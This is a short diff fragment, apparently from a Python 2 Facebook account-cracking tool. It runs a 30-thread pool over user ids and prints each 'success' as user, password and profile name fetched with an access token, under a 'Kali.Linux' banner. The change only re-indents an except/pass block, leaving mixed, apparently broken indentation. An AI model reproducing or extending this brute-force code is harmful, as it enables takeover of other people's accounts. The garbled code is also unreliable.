@@ -382,9 +382,8 @@ def pilih_super():
 		                                                    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])															
 		                                                    z = json.loads(x.text)															
 		                                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass9+"\033[36;1m |\033[37;1m "+z['name']
-								except:	
-								pass														
-																	
+	except:	
+        pass																														
 	p = ThreadPool(30)																
 	p.map(main, id)																
 	print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.Linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"																
